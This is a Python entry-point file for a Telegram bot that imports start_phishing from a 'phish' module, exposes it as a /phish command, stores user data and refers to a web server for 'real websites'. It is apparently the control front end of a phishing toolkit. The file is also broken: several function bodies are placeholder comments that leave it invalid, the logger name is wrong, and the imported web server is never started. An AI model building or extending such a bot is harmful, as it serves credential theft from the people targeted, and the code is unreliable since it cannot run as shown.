import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import json
import os
from const import BOT_TOKEN, USER_DATA_FILE
from phish import start_phishing, get_stats

# ✅ ADD THIS LINE
from webserver import start_server  # Import web server

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(name)

def ensure_user_data_file():
    """Ensure user_data.json exists with proper structure"""
    if not os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, 'w') as f:
            json.dump({"users": {}}, f, indent=2)

def save_user_data(update: Update):
    # ... keep your existing code exactly as is ...

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... keep your existing code exactly as is ...

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... keep your existing code exactly as is ...

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... keep your existing code exactly as is ...

def main():
    # Ensure user data file exists
    ensure_user_data_file()
    
    # ✅ ADD THIS LINE - Start web server
    logger.info("Starting web server for real websites...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("phish", start_phishing))
    application.add_handler(CommandHandler("stats", get_stats))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the Bot
    logger.info("Bot is starting...")
    application.run_polling()

if __name__ == '__main__':
    main()
